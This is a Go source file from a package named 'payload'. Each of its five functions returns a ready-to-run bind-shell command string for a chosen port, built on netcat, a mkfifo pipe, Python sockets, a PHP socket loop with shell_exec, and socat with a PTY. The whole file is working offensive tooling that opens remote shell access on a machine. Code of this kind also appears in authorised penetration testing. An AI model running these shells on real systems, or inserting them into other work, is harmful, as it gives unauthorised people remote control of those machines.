package payload

import "fmt"

// NetcatBind starts a netcat bind shell on the given port.
func NetcatBind(port int) string {
	return fmt.Sprintf("nc -lvnp %d -e /bin/sh", port)
}

// NetcatMkfifoBind starts a mkfifo-based bind shell.
func NetcatMkfifoBind(port int) string {
	return fmt.Sprintf(
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp %d >/tmp/f",
		port,
	)
}

// PythonBind starts a Python bind shell on the given port.
func PythonBind(port int) string {
	return fmt.Sprintf(
		`python3 -c 'import socket,subprocess,os;`+
			`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`+
			`s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);`+
			`s.bind(("0.0.0.0",%d));s.listen(1);c,a=s.accept();`+
			`os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);`+
			`subprocess.call(["/bin/sh","-i"])'`,
		port,
	)
}

// PHPBind starts a PHP bind shell on the given port.
func PHPBind(port int) string {
	return fmt.Sprintf(
		`php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);`+
			`socket_bind($s,"0.0.0.0",%d);socket_listen($s,1);`+
			`$c=socket_accept($s);`+
			`while(1){socket_write($c,"$ ");`+
			`$i=socket_read($c,2048);`+
			`$o=shell_exec($i);socket_write($c,$o);}'`,
		port,
	)
}

// SocatBind starts a socat bind shell with PTY on the given port.
func SocatBind(port int) string {
	return fmt.Sprintf(
		"socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
		port,
	)
}
